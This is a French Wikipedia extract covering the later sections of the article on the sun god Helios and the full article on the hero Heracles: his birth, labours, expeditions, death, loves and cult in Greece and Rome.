La tension entre la vénération religieuse traditionnelle de Hélios, enrichies par des valeurs éthiques et un symbolisme poétique ajouté par Pindare, Eschyle et Sophocle et l'examen proto-scientifique du Soleil par les Ioniens éclata lors du procès d'Anaxagore en 450 av. J.-C, dans lequel Anaxagore assurait que le Soleil était en réalité une gigantesque boule de métal en fusion. Son procès préfigura celui de Socrate pour impiété, qui deviendra l'un des plus célèbres de l'histoire occidentale.
Dans "La République" de Platon, Hélios, le Soleil, est la progéniture symbolique de l'idée du Bien.
Bien que l'importance exacte du culte de Hélios à Sparte reste inconnue, il semblerait que Hélène était la divinité solaire locale.
Confusion avec Apollon.
Hélios est parfois confondu avec Apollon. Walter Burkert observe : 
Dans la littérature homérique, Apollon est clairement identifié comme un dieu différent de Hélios, avec un arc en argent (et non en or) et sans caractéristiques solaires. La référence la plus ancienne où l'on mélange les identités d'Apollon et de Hélios est dans les fragments survivants de la pièce "Phaéton" d'Euripide, dans un monologue où Clymène, la mère de Phaéton, se lamente que Hélios a détruit son enfant, .
Durant la période hellénistique, Apollon est de plus en plus identifié au mythe solaire et Phébus, l'épithète le plus souvent accordé à Apollon, est plus tard accordé au dieu Sol dans la mythologie romaine.
Cette confusion devint un thème récurrent dans les textes philosophiques et apparaît dans les œuvres de Parménide, Empédocle, Plutarque ou encore Cratès de Thèbes entre autres, ainsi que dans certains textes orphiques. Ératosthène de Cyrène écrit d'Orphée dans les "Catastérismes" : Dionysos et Asclépios sont également parfois associés à cet Apollon Hélios.
Antiquité tardive.
Durant l'Antiquité tardive, on attribua à Hélios un grand nombre d'éléments religieux, mythologiques et littéraires appartenant à d'autres divinités, notamment Apollon et le dieu romain Sol. En 274 ap. J.-C, le 25 décembre, lors du solstice d'hiver, l'empereur romain Aurélien instaure le culte de Sol Invictus (« Soleil invaincu »). Ce nouveau culte réunit une imagerie non seulement associée à Hélios et Sol, mais également bon nombre d'éléments syncrétiques d'autres divinités, autrefois distinctes. D'autres éléments syncrétiques de cette période incluent un "Hymne Orphique à Hélios" ; le culte de Mithra, dans lequel il est dit que Sol contrôle les éléments ; des sorts et incantations destinées à Hélios dans les Papyrus grecs magiques ; lHymne à Hélios" de Proclus ; lOration à Hélios" de Julien ; et un épisode dans les "Dionysiaques" de Nonnos de Panopolis. Dans ces œuvres, Hélios n'est pas seulement assimilé à Mithra ou à Harpocrate, mais également au Dieu monothéiste judéo-chrétien.
Julien, le dernier empereur païen de Rome, fait de Hélios la principale divinité de sa religion, qui combine des éléments du mithraïsme et du néoplatonisme. Pour Julien, Hélios constitue une triade : ce que Platon appelle la « forme du bien », le savoir suprême ; Hélios-Mithras, le souverain d'un royaume intellectuel ; et le Soleil, sa manifestation physique dans le royaume visible. Julien le considère comme un médiateur et un unificateur, pas seulement de cette triade, mais de toutes les choses vivantes, un concept probablement importé du mithraïsme, et qui a pu inspirer le Logos chrétien. La conception théologique de Hélios par Julien a été décrite comme « quasiment monothéiste », contrairement à celles d'autres néoplatoniciens comme Jamblique, même si d'autres dieux traditionnels vénérés dans tout le bassin méditerranéen ainsi que certains principes et manifestations y ont été inclus.
Une mosaïque retrouvée dans la nécropole du Vatican (Mausolée M) représente une figure au style très similaire à celui de Sol/Hélios, couronné de rayons solaires et conduisant un char. Des savants l'ont également identifiée comme étant une représentation du Christ, notant que Clément d'Alexandrie avait également décrit le Christ comme conduisant un char à travers le ciel. D'autres encore doutent de cette association, et pensent que la figure n'est qu'une représentation non-religieuse du Soleil.
Dans les Papyrus grecs magiques.
Hélios est une figure prééminente des Papyrus grecs magiques, un groupe de manuscrits découverts en Égypte et datant de la fin de l'époque ptolémaïque à l'époque de la domination romaine et couvrant une période du au . Dans ces manuscrits (principalement des fragments), Hélios est considéré comme le créateur de la vie, le seigneur du Ciel et du cosmos, et le dieu de la mer. On dit qu'il peut également prendre la forme de douze animaux représentant chaque heure du jour, motif en relation avec les douze signes du zodiaque.
Les Papyrus assimilent souvent Hélios à une grande variété de divinités. Il est décrit « assis sur un lotus, orné de rayons », à la manière de Harpocrate, souvent représenté assis sur une fleur de lotus, représentant le soleil levant. Selon le philosophe Jamblique, .
Comme avec l'empereur Julien, Hélios est aussi assimilé avec Mithras dans les Papyrus. La Liturgie de Mithras les combine en Hélios-Mithras, qui a soi-disant révélé les secrets de l'immortalité au mage qui aurait écrit le texte. Certains des écrits dépeignent Hélios-Mithras naviguant dans le ciel dans un bateau et non pas un char, motif que l'on assimile généralement au dieu-soleil égyptien Râ. Hélios est également décrit comme « retenant le serpent », probablement une référence à Apophis, le dieu-serpent qui, selon la mythologie égyptienne, attaque le bateau de Râ pendant son voyage dans l'au-delà une fois la nuit tombée.
Dans nombre de ces papyrus, Hélios est identifié à Iao, un nom dérivé de celui du Dieu de l'Israël antique Yahweh. Il est aussi appelé « le dieu des dieux » et est assimilé à Agathodémon, à Horus et à Harpocrate.
Les philosophes néoplatoniciens Proclus et Jamblique ont essayé d'interpréter plusieurs synthèses trouvées dans les Papyrus grecs magiques et d'autres travaux concernant Hélios, pour en faire un dieu englobant les attributs de nombreuses divinités. Proclus le montre en dieu cosmique doté de nombreuses formes et caractéristiques. Elles sont « lovées » en lui, et sont distribuées à tous ceux qui « participent à sa nature », comme les anges, les démons, les âmes, les animaux, les plantes et les minéraux. Toutes ces choses sont importantes pour la pratique néoplatonicienne de la théurgie, une forme de magie consistant à invoquer les dieux et les puissances surnaturelles. Jamblique note que la théurgie implique souvent l'utilisation de . Pour les théurges, le pouvoir élémentaire de ces choses, sacrées pour des dieux particuliers, ferait appel à un genre de « magie sympathique ».
Assimilation avec d'autres dieux.
Le dieu étrusque du Soleil, équivalent de Hélios, était nommé Usil. Son nom apparaît sur le Foie de Plaisance à côté de Tiur (la Lune). Il est souvent représenté sortant de la mer avec une boule de fer dans chaque main, notamment sur les miroirs en bronze étrusques de l'époque archaïque. Sur les miroirs étrusques de l'époque classique, il apparaît avec un halo.
Dans la littérature classique, Hélios est aussi quelquefois assimilé au dieu des dieux de l'Olympe, Zeus, dont il est, implicitement ou explicitement, l'œil. Par exemple, Hésiode dit que le Soleil est l'œil de Zeus. Cette vision est probablement tirée de la religion proto-indo-européenne, dans laquelle le Soleil était soi-disant l'œil de *Dyḗus ph₂tḗr. Selon un dicton orphique, supposément énoncé par un oracle d'Apollon : « Il n'est qu'un Zeus, un Hadès, un Hélios, c'est le dieu Dionysos. » En citant cela dans son hymne "Sur le Roi-Soleil", l'empereur Julien substitue Dionysos pour le remplacer par Sarapis, divinité hellénistique acceptée par la mythologie égyptienne. Julien conclut alors les paroles de cet oracle sur cette phrase : « La souveraineté sur les dieux intelligents est commune au Soleil et à Jupiter, ou plutôt qu'elle n'en fait qu'une. »
Diodore de Sicile reporte que les Chaldéens appelaient Cronos (Saturne) Hélios, ou Soleil, expliquant cela par le fait que Saturne était la plus visible des planètes.
Mythe.
Le mythe le plus connu de Hélios concerne son fils Phaéton, qui tenta de conduire le char solaire de son père mais en perdit le contrôle, réduisant la Terre en cendres. Tous les mortels seraient morts si Zeus n'était pas intervenu en lançant le foudre sur Phaéton, le tuant instantanément.
Hélios est quelquefois doté de l'épithète "Panoptes" (« qui voit tout »). Dans le mythe raconté à la cour d'Alcinoos dans l"Odyssée" d'Homère, Aphrodite, la femme d'Héphaïstos, couche secrètement avec Arès, mais Hélios qui voit tout les espionne et dénonce l'adultère à Héphaïstos, qui piège le couple dans des filets invisiblement fins pour les humilier et les punir.
Toujours dans l’"Odyssée", Ulysse et son équipage arrivent en Trinacrie, une île sacrée au dieu-soleil, que Circé nomme Hypérion plutôt que Hélios. C'est ici qu'est gardé le bétail de Hélios :
Malgré les avertissements d'Ulysse, quand les vivres viennent à manquer, son équipage commence à voler, tuer et manger les bêtes du bétail de Hélios. Les gardiennes de l'île préviennent leur père, qui demande à Zeus de neutraliser les hommes, ou bien il prendra le Soleil et le fera briller aux Enfers. Zeus détruit alors le navire avec son foudre, ne laissant survivre qu'Ulysse.
Sur un vase grec, Hélios apparaît traversant la mer dans la coupelle d'un trépied sacrificiel, symbole solaire.
Dans "Les Deipnosophistes", Athénée de Naucratis écrit qu'au lever du soleil, Hélios grimpe dans une grande coupelle dorée et traverse le monde, du jardin des Hespérides, le point le plus occidental du monde, jusqu'en Éthiopie, où il passe la nuit.
Quand Héraclès alla en Érythie où il devait voler le troupeau de Géryon, il traversa le désert libyen et fut si frustré par la chaleur qu'il tira une flèche sur le Soleil. Immédiatement, il réalisa son erreur et fondit en excuses et en prières. Hélios, ému par le courage d'Héraclès, lui donna alors la coupelle dorée qu'il utilisait pour voyager d'ouest en est. Héraclès s'en servit pour arriver en Érythie.
Hélios et Clytie.
Dans la mythologie grecque, Clytie (en grec ancien ou ) est une des Océanides, fille d'Océan et Téthys.
Son histoire est contée par Ovide : elle fut aimée d'Hélios mais ensuite supplantée par Leucothoé. Elle en référa alors au père de cette dernière, Orchamos, qui punit sa fille pour l'avoir déshonoré en l'enterrant vivante. Le dieu du soleil tenta de la secourir, mais en vain. Il arrosa alors la terre et le corps de son amante d'un nectar parfumé : il en naquit l'encens. Mais au lieu de permettre à Clytie de regagner l'amour d'Hélios, la mort de Leucothoé ne lui rapporta que le ressentiment de celui-ci. Désespérée, elle s'assit nue sur les rochers et y demeura durant neuf jours, sans eau ni nourriture, tournée vers le soleil, suivant du regard la course du char de son bien-aimé. Jaunie et brunie par son éclat, elle se changea alors en tournesol.
Représentations.
L'épisode 33 de La petite Olympe et les dieux ("Hélios, le dieux du soleil") lui est consacré.

</doc>
<doc id="1437" url="https://fr.wikipedia.org/wiki?curid=1437" title="Héraclès">
Héraclès

Héraclès (en grec ancien , signifiant « Gloire d'Héra »), de son premier nom Alcide, fils de Zeus et d’Alcmène, est l'un des héros les plus vénérés de la Grèce antique. La mythologie grecque lui prête un très grand nombre d’aventures qui le voient voyager à travers le monde connu des Doriens puis dans toute la Méditerranée, à partir de l’expansion de la Grande-Grèce, jusqu’aux Enfers. Les plus célèbres de ses exploits sont les Douze Travaux. Il est mentionné dans la littérature grecque dès Homère.
Héraclès correspond à l’Hercule de la mythologie romaine, et il est identifié au Melkart phénicien, à l'Hercle étrusque et au Kakasbos en Asie Mineure. L’Hercule des Romains est parfois dépeint comme moins violent que son "alter ego" grec dans les récits où il intervient et connaît quelques aventures se déroulant spécifiquement en Italie.
Mythe.
Des nombreuses sources conservées de la mythologie grecque, seuls deux auteurs nous rapportent entièrement la vie d'Héraclès : le Pseudo-Apollodore dans son ouvrage la "Bibliothèque" et Diodore de Sicile dans son quatrième livre de la "Bibliothèque historique". Tous deux suivent la même trame : une vie scindée en trois parties, donnant une place centrale aux Travaux d'Héraclès autour desquels se place avant la vie à Thèbes et après les expéditions punitives du héros.
Avant les Travaux.
Conception et naissance.
Héraclès naît à Thèbes, ou à Tirynthe, de Zeus et d'Alcmène, descendante du héros Persée et femme du roi Amphitryon. Le roi des dieux a en effet décidé d'avoir un fils capable de venir en aide aux hommes comme aux dieux. Profitant de l'absence du mari, en guerre contre les Taphiens et les Téléboéens, Zeus descend de l'Olympe et, prenant l'aspect d'Amphitryon, passe sa nuit avec Alcmène après avoir persuadé Hélios, dieu du soleil, de ne pas se lever pendant trois jours, faisant ainsi durer sa nuit avec la femme d'Amphitryon. Dans la même nuit, Alcmène va également avoir un rapport avec son mari de retour de campagne. Aristote, dans "Histoire des animaux", lui donne dans sa descendance, dont une seule fille.
Alors qu'elle va accoucher, Zeus promet que l'enfant à naître ce jour-là régnera sur tous ses voisins. Pour se venger des infidélités de son mari, Héra retarde la délivrance d'Alcmène en retenant les Ilithyes, déesses de l'accouchement, et elle demande aux Moires d'aller chez Alcmène et de croiser ses jambes, ce qui l'empêche d'accoucher d'Héraclès ; elle fait naître avant terme Eurysthée, fils du roi Sthénélos d'Argos. Ainsi, Eurysthée reçoit la royauté de l'Argolide à la place d'Héraclès. Alors qu'Alcmène est incapable d'enfanter et au supplice, une de ses servantes les plus fidèles, Galanthis, va trouver les Ilithyes pour leur annoncer qu'elles ont échoué et qu'Alcmène a réussi à accoucher. Les Ilithyes rappellent alors les Moires, et Alcmène peut accoucher ; elle donne naissance à deux enfants : Héraclès, fils de Zeus, et Iphiclès, fils d'Amphitryon. Ils naissent tous deux jumeaux avec un jour d’écart. Galanthis est punie par Héra, qui la transforme en belette, et plus tard, Héraclès fera construire en son honneur un sanctuaire à Thèbes.
Enfance.
Peu de temps après la naissance d’Héraclès, Hermès enlève l’enfant et le place dans le lit d’Héra endormie : aucun des fils de Zeus ne peut devenir immortel s'il n'a tété au sein de la déesse. Affamé, le bébé s'approche de celle-ci et commence à téter. Se réveillant, Héra aperçoit l'enfant et indignée, le repousse ; le lait divin se répand dans le ciel en une traînée blanchâtre, la Voie lactée. Dans une autre version, Alcmène abandonne son enfant par crainte de la vengeance d'Héra. Athéna convainc cette dernière d'allaiter le bébé, mais Héraclès tète trop goulûment et Athéna doit le rendre à sa mère.
Alors qu'Héraclès est encore bébé, Héra envoie des serpents pour le tuer, mais celui-ci les étrangle sans difficulté. Alertés par les cris des femmes, Alcmène et Amphitryon accourent et trouvent les serpents morts. Amphitryon convoque alors le devin Tirésias, qui prophétise les hauts faits du héros et son apothéose.
Dans une autre version, Amphitryon dépose lui-même les serpents pour découvrir lequel des deux enfants est le sien et lequel est le fils de Zeus. Ce récit implique qu'Amphitryon soit au courant de l'infidélité de sa femme. Sur quelques vases de Grande-Grèce, on le voit d'ailleurs empiler du bois autour d'un autel près duquel Alcmène s'est réfugiée ; il s'apprête à y mettre le feu quand Zeus envoie un éclair pour dissuader Amphitryon et deux nuages pour éteindre les flammes.
Selon certains récits, Héraclès porte d'abord le nom d'Alcide (en grec , dérivé d', « force, vigueur ») ; Héra le rebaptise Héraclès, c'est-à-dire « gloire d'Héra », car c'est à ses ordres que le héros a acquis sa renommée et surtout Héra va lui soumettre les épreuves qui vont forger sa gloire et la faire rejaillir sur elle. Alternativement, c'est la Pythie de Delphes qui lui conseille de changer de nom après qu'il a tué ses enfants, poussé par Héra qui l'a rendu fou ; il prend ce nom de manière propitiatoire après avoir expié son crime. Diodore de Sicile affirme que le nom original du héros était Alcée (en grec ), en référence à son grand-père paternel Alcée fils de Persée ; la responsabilité du changement de nom incombe alors soit à la Sibylle, soit aux Argiens.
Formation.
Comme beaucoup de héros grecs, Héraclès est l'élève du centaure Chiron. Des sources tardives lui donnent un grand nombre de maîtres : Castor (originaire d'Argos, à ne pas confondre avec Castor le Dioscure) pour le maniement des armes, Amphitryon pour la conduite des chars, Eurytos ou encore Rhadamanthe pour le tir à l'arc.
Linos enseigne les lettres et la musique à Héraclès et Orphée. Contrairement à son demi-frère, le héros est indiscipliné et turbulent ; frappé par Linos, Héraclès tue celui-ci à coups de tabouret ou, selon la version, à coups de lyre. Héraclès est accusé de meurtre, puis acquitté après avoir invoqué une sentence de Rhadamanthe consacrant le principe de légitime défense. Parce que la fougue d'Héraclès et son manque de maîtrise de soi deviennent une menace, Amphitryon l’éloigne de la cour. Le héros est envoyé surveiller ses troupeaux à la campagne où son éducation est reprise par Teutoros, un bouvier scythe qui lui enseigne le tir à l’arc. Il se signale déjà par sa force et sa stature : il atteint la taille considérable de quatre coudées.
Chez Thespios.
À , Héraclès est invité par le roi Thespios, souverain de Thespies. Soucieux d'avoir le héros comme père de ses petits-enfants, Thespios lui envoie chaque soir l'une de ses cinquante filles ; Héraclès croit retrouver toujours la même jeune fille et devient ainsi le père de cinquante fils, les Thespiades. Dans d'autres versions, l'exploit est accompli au cours de cinq nuits, voire d'une seule nuit. Dans ce dernier récit, l'une des filles de Thespios refuse d'entrer dans la couche d'Héraclès ; elle est punie en devenant prêtresse du héros et vouée à la virginité perpétuelle ; les Thespiades sont au nombre de cinquante-et-un, l'aînée et la cadette des filles de Thespios donnant naissance à des jumeaux.
Selon l'un des récits, la raison première de la venue à Thespies d'Héraclès est le lion du mont Cithéron, qui ravage les troupeaux d'Amphitryon et de Thespios. Héraclès abat l'animal, le dépèce et se couvre la tête de sa peau en guise de casque.
La guerre contre les Minyens.
Périérès, le conducteur du char de Ménécée (roi de Thèbes et père de Créon), blesse mortellement Clyménos, roi d’Orchomène, en lui lançant une pierre alors qu'il se trouve dans le sanctuaire d’Onchestos, pendant l'une des fêtes de Poséidon. Avant d’expirer, Clyménos fait promettre à son fils, Erginos, de le venger. Erginos vainc le roi Créon et oblige ce dernier à lui fournir annuellement, et durant vingt ans, un cheptel de cent bêtes. Afin de percevoir cette redevance, Erginos envoie annuellement une délégation.
Après son exploit sur le mont Cithéron, Héraclès redescend vers Thèbes et croise la route de ces émissaires. Ne supportant pas l’humiliation imposée à Créon, Héraclès tranche le nez et les oreilles à chacun d’eux et en fait un pendentif ; les percepteurs sont ainsi réexpédiés au palais d’Erginos.
Furieux, Erginos marche contre Thèbes. Équipé d'armes données par Athéna, Héraclès mène les siens au combat et remporte la victoire, malgré la mort d'Amphitryon pendant les combats. Le héros impose aux Minyens d'Orchomène le double du tribut infligé à Thèbes.
Les Travaux.
La folie d’Héraclès.
En récompense de sa victoire contre Erginos, Créon donne à Héraclès la main de sa fille Mégara, dont il a plusieurs enfants : les "Chalkoarai". Leur nombre varie de deux à huit suivant les auteurs.
Dans la version la plus ancienne, Héraclès devenu fou jette ses enfants au feu. À son réveil, Héraclès retourne chez Thespios pour être purifié puis, après avoir consulté l'oracle de Delphes, va à Tirynthe pour servir Eurysthée. Cet accès de folie est généralement attribué à Héra, qui veut l'obliger à se mettre au service d'Eurysthée.
Selon Euripide, l'épisode est lié à l'usurpation du trône de Thèbes par Lycos, fils de Dircé. En l'absence d'Héraclès, descendu aux Enfers pour chercher Cerbère, Lycos assassine Créon et ses fils. À son retour, Héraclès tue Lycos. Frappé par Iris et Lyssa (la Folie), envoyées par Héra, le héros devient la proie d'une rage meurtrière qui le pousse à massacrer ses enfants, les prenant pour ceux d'Eurysthée. Mégara tente de sauver ses enfants, mais elle rejoint elle aussi le rang des victimes. À son réveil, Héraclès redevenu lucide songe d'abord à se suicider. Thésée, qui vient d'arriver, le convainc de n'en rien faire et l'emmène à Athènes.
Pour Ovide et Hygin, Hercule va d'abord voir Nélée, roi de Pýlos et son cousin (un fils de Poséidon), pour que celui-ci le purifie de ses meurtres mais Nélée refuse. Furieux, Hercule tue Nélée et ses fils à l'exception de Nestor qui était absent. Il ira ensuite voir Eurysthée qui se demande d'abord quoi faire, craignant de subir le même sort que Nélée, et qui lui donnera finalement les travaux sous le conseil d'Héra.
Exploits.
Par le nombre de ses hauts faits, Héraclès se distingue de la plupart des héros grecs, comme Persée, Thésée ou Bellérophon, dont la carrière est centrée autour d'un exploit unique. Les plus connus sont les Douze Travaux, entrepris sur l'ordre d'Eurysthée :
C'est au cours de la chasse du lion de Némée qu'il acquiert ses principaux attributs : la massue taillée dans le tronc d'un olivier sauvage et la "léonté", la peau de lion.
Des aventures secondaires se sont greffées plus ou moins artificiellement sur les Douze Travaux :
Après les Travaux.
Expéditions.
Héraclès prend également part à plusieurs expéditions qui constituent autant de cycles et d'exploits.
La première prend sa source dans une aventure survenue après la quête de la ceinture d'Hippolyte : Héraclès a tué un monstre marin qui ravageait la ville de Troie, sauvant au passage la princesse Hésione qui allait lui être sacrifiée. Le roi Laomédon, revenant sur la promesse initiale de lui offrir quelques-uns de ses chevaux, refuse de lui verser son salaire. Une fois les Douze Travaux terminés, Héraclès monte une expédition de six nefs chargées d'un petit nombre d'hommes pour châtier le mauvais payeur : après avoir fait la guerre au roi Laomédon et ses fils, qu'il tue, il prend Troie. À l'exception de Priam, personne n'est épargné. Au cours de son deuxième séjour dans la cité, il s'unit à Augé, qui lui donnera Télèphe.
Pendant son trajet de retour, Héra demande au dieu Hypnos d'endormir Zeus, puis profite du sommeil de son mari pour déclencher une tempête qui jette le vaisseau sur la côte de Cos. Les habitants de l'île, croyant à un débarquement de pirates, attaquent Héraclès et son équipage à coups de pierre ; le héros tue alors Eurypyle, roi de l'île, et s'unit à sa fille, Chalciope, qui lui donnera Thessalos.
Le second cycle est celui de la guerre contre Augias, qui a refusé de payer son dû après que le héros a nettoyé ses écuries. Là encore, Héraclès monte une expédition, mais son armée est massacrée par les Molionides, qui profitent d'une maladie du héros pour attaquer son camp par surprise. À son tour, Héraclès les surprend dans une embuscade, puis attaque de nouveau Augias et le tue. C'est au terme de ces aventures qu'Héraclès fonde les Jeux olympiques, après avoir délimité par des palissades l'enceinte sacrée de l'Altis, le sanctuaire de Zeus.
Le troisième cycle est celui de l'expédition contre Pylos où, pour se venger du refus de Nélée de le purifier après le meurtre d'Iphitos, Héraclès assiégea la ville et tua son roi ainsi que tous ses enfants hormis Nestor qui se trouva être absent.
À ce propos, Dioné raconte dans l’"Iliade" comment Héraclès blesse Hadès d'une flèche à l'entrée des Enfers grecs et « le laisse au milieu des morts » ; Hadès doit monter dans l'Olympe pour se faire soigner par Péan. Les commentateurs antiques ont fourni plusieurs explications à ce passage curieux : l'épisode peut prendre place lors de la descente aux Enfers du héros pour capturer Cerbère. Ce pourrait également être une allusion à l'attaque d'Héraclès contre les Pyliens, qui ont apporté leur soutien à Orchomène contre Thèbes, ou encore au massacre des fils de Nélée à Pylos par le héros. Dans ce même chant de l"'Iliade", Homère fait mention d'un tir de flèche à trois pointes décochée par Héraclès blessant Héra au sein droit.
Le dernier cycle est celui d'Œchalie. Voulant se venger de n'avoir pas obtenu la main d'Iole, la fille d'Eurytos, qu'il avait gagnée dans un concours de tir à l'arc, Héraclès mena une expédition contre le roi. Laissant Déjanire, sa dernière épouse, à Trachis, il partit vers Œchalie (Thessalie ou Eubée) à la tête d'une armée d'alliés. Un violent combat s'engagea, dans lequel deux des fils de Céyx furent tués. Héraclès remporta la victoire et tua Eurytos ainsi que tous ses fils. Iole, qui tenta de s'enfuir en se précipitant du haut des remparts, fut soutenue dans l'air par le vent qui enfla sa robe, et redescendit sans se blesser. Elle devint la concubine du héros, qui l'envoya à Trachis avec d'autres prisonniers.
Mort et apothéose.
Héraclès épousa ensuite Déjanire, fille d'Œnée. Sophocle, dans "Les Trachiniennes", relate la façon dont Déjanire remit une tunique empoisonnée qui allait être fatale à Héraclès. Au cours d'un voyage, face au grand fleuve Événos en proie à une crue exceptionnelle, Héraclès vit que, s'il pouvait facilement le franchir, il ne pouvait le faire en portant Déjanire. Se présenta alors à eux un centaure nommé Nessos qui gagnait son salaire en faisant franchir le fleuve aux voyageurs ; il offrit de porter Déjanire, tandis qu’Héraclès nagerait de son côté. Lorsqu'Héraclès arriva, il vit que Nessos tentait d'abuser de Déjanire. Il prit alors une flèche enduite du poison de l'Hydre de Lerne et la décocha entre les omoplates de Nessos. À l'agonie, ce dernier dit à Déjanire de recueillir son sang qui servira de charme au cœur d'Héraclès afin de s'assurer de sa fidélité. Déjanire obéit.
Bien plus tard, Déjanire, craignant de perdre son époux qui s'était épris d'Iole, la fille du roi Eurytos, remit une tunique enduite du sang de Nessos à Lichas et insista pour qu'il la transmette à Héraclès et qu'il la revêtît. Héraclès sentit cependant que le vêtement le brûlait ; tentant de s'en défaire, il constata que sa peau partait avec, en lambeaux. Il tomba alors dans le piège auquel Déjanire s'était laissé prendre : le sang du centaure était souillé par le poison de l'Hydre de Lerne, qui avait tué Nessos et qui maintenant lui rongeait la chair.
Son fils Hyllos alors présent, et ayant vu dans quel état était son père, s'en alla à la demeure familiale pour informer sa mère des conséquences de son acte. Déjanire, alors épouvantée par son action, ne sut trouver les mots et partit. Hyllos, devant son silence, qui était pour lui signe d'aveux, la tança vertement. Par la suite, Déjanire se suicida à l'aide d'une lame à double tranchant sur le lit d'Héraclès. Hyllos la découvrit alors inerte et se rendit compte que c'était lui qui, par sa colère, l'avait conduite à cet acte. Il apprit trop tard des gens de la maison qu'elle avait agi contre son gré sous l'inspiration du centaure.
Pour mettre fin à sa souffrance, Héraclès demanda à son fils Hyllos d'ériger un bûcher sur le mont Œta et de l'y déposer dans les flammes comme remède immédiat à ses maux. Zeus (ou Athéna ou Hermès selon les versions) le fit monter sur l'Olympe parmi les dieux.
Sur l'Olympe, Héraclès put se réconcilier avec Héra, devint immortel et fut consacré dieu des éphèbes. Il y épousa en outre la déesse de la jeunesse, Hébé, et ils eurent ensemble deux enfants : Alexiarès et Anicétos. Selon d'autres versions, sa « mort » n'aurait été qu'un passage nécessaire pour se séparer des éléments hérités de sa mère mortelle, Héraclès ayant gagné son immortalité dans son enfance après avoir tété le lait d'Héra.
Amours.
Le goût d'Héraclès pour les femmes est connu et lui a valu le qualificatif de , philogyne (« aimant les femmes »), mais les mythes évoquent également plusieurs relations avec des hommes.
Femmes.
Héraclès s'est marié quatre fois au cours de sa vie. Sa première épouse fut Mégara. Plus tard, devenu esclave, il fut affranchi par Omphale, reine de Lydie, et l'épousa. Il se battit ensuite contre le dieu-fleuve Achéloos pour l'amour de Déjanire. Après sa mort, il se maria sur l'Olympe avec la déesse de la jeunesse Hébé.
Hommes.
Héraclès a connu plusieurs relations homosexuelles (ou pédérastiques, relevant de rites initiatiques bien attestés dans la Grèce ancienne). Ses éromènes les plus connus sont Iolaos, son neveu, et Hylas.
Iolaos, conducteur du char d'Héraclès et compagnon d'armes de plusieurs de ses travaux, entretient une relation avec lui dans plusieurs versions. Plutarque, dans son "Erotikos" ("Dialogue sur l'amour"), indique qu'Iolaos fut l'éromène d'Héraclès et que les couples d'hommes, jusqu'à son époque, viennent honorer le tombeau d'Iolaos et s'y échangent des serments de fidélité et des gages de bonne foi.
Héraclès recueille Hylas, fils de Théodamas, après avoir tué son père, et Hylas devient son éromène. Mais le jeune homme est enlevé par des nymphes des eaux pendant la quête de la toison d'or, alors qu'il est allé puiser de l'eau à une source où vivent ces nymphes. Héraclès, bouleversé par sa disparition, laisse les Argonautes repartir sans lui afin de poursuivre ses recherches, mais ne le retrouve jamais.
Un autre éromène d'Héraclès intervient dans le récit que fait le Pseudo-Apollodore de son combat contre Diomède le Thrace et ses juments cannibales. Les Bistones viennent prêter main-forte à Diomède. Héraclès, pour les combattre, doit confier les juments cannibales à la garde de son éromène, Abdéros, que les juments jettent à terre et traînent sur le sol derrière elles. Après avoir tué Diomède et mis en fuite les Bistones survivants, Héraclès, affligé par la perte de son aimé, élève un tombeau en l'honneur d'Abdère et fonde à proximité une cité qu'il nomme Abdère.
Héraclès est également amoureux d'Admète selon Plutarque dans le "Dialogue sur l'amour", et l'auteur indique que c'est pour faire plaisir à Admète qu'Héraclès sauve du trépas son épouse Alceste.
Une scholie aux "Argonautiques" d'Apollonios de Rhodes commentant le vers 1207 du chant propose une liste des aimés d'Héraclès : Diomos est également mentionné par le lexique d'Étienne de Byzance, qui indique qu'Héraclès tombe amoureux de Diomos lorsqu'il reçoit l'hospitalité de son père Collytos, et que Diomos est le héros éponyme du dème de Diomeia, qui fait partie administrativement de la tribu Aegeis, en Attique. Perithoas, Phrix et l'idée d'une relation amoureuse avec Philoctète n'apparaissent que dans cette scholie.
Culte.
En Grèce.
Le culte d'Héraclès est répandu dans toute la Grèce, à l'exception de la Crète ; il s'adresse tantôt au dieu, tantôt au héros. Il arrive que les deux cultes coexistent, comme à Thasos ou à Sicyone. Il est plus particulièrement rattaché aux éphèbes et au gymnase et se caractérise par de grands banquets de viande .
Dans la sphère privée, Héraclès est avant tout "Alexikakos", celui qui protège du mal. Par conséquent, on retrouve son image sur des amulettes. "Herakleis", « par Héraclès », est une exclamation courante, comme l'est ensuite "mehercle" en latin.
Héraclès est également célébré en tant qu'ancêtre des Doriens par le biais du mythe des Héraclides.
Hors de Grèce.
Les auteurs anciens mentionnent plusieurs cultes rendus hors de Grèce à Héraclès ou à des dieux qu'ils identifient à Héraclès. Hérodote, dans l’"Enquête", évoque un Héraclès homonyme de l'Héraclès fils d'Alcmène et plus ancien que lui, honoré en Égypte.
En Asie Mineure, le dieu guerrier est illustré à dos de cheval, et non en char, ce qui est propre à ce culte particulier. Il côtoie Kakasbos, dieu anatolien, dont les traces (reliefs et dédicaces) sont absolument équivalentes à celles que le culte d'Héraclès a laissées dans la même région, soit en Lycie-Pisidie. Les deux divinités se sont probablement rencontrées dans lors des deux derniers siècles , leurs cultes ayant alors été entremêlés, avant de connaître un réel engouement aux .
A Agrigente, colonie grecque établie en Sicile, le temple d'Héraclès remonte au début du 
En Étrurie, Héraclès s'est très tôt acclimaté sous le nom de Hercle. Il y est non pas un héros, mais une divinité, et certains aspects de son mythe y semblent proprement étrusques.
À Rome.
Héraclès (nommé "Hercles", puis "Hercoles", puis "Hercules") devint un dieu considérable de l'État romain. Sur le débouché de la vallée du Grand Cirque, deux lieux étaient rattachés par la légende et la culture au héros grec. Ces deux endroits attribuaient leur principal monument au héros lui-même. Le temple d'Hercule Victor, bâti près de l'autel de Jupiter Inventor, est censé avoir été élevé par Hercule lui-même ou ses compagnons après la victoire de celui-ci contre Cacus. En 312 , selon la tradition annalistique, le culte jusqu'ici familial devint étatique et dorénavant, ce fut le préteur urbain, qui chaque année, au nom de Rome, sacrifia le bœuf ou la génisse à l'Ara maxima Herculis.
Plus caractéristique encore que la cérémonie annuelle était le service de la dîme. Introduits par les Grecs, le culte d'Hercule devint celui de marchands qui associaient leurs entreprises risquées aux multiples aventures du héros grec, puis des généraux heureux dans leurs batailles. Ainsi, plusieurs des sanctuaires herculéens mineurs qui ont fleuri au cours des âges sont le fait de généraux. C'est à Pompée que l'on doit la restauration du "templum Herculis Pompeiani", titre remarquable puisqu'il paraît faire du dieu le protecteur personnel du général et homme d'État romain. Le temple même d'Hercule Victor jouait un rôle lors de la cérémonie du triomphe des généraux victorieux : le cortège passait devant le temple et on couvrait de vêtements somptueux la statue en bronze d'Hercule qu'on avait placée sur le seuil pour le faire participer à l'enthousiasme général.
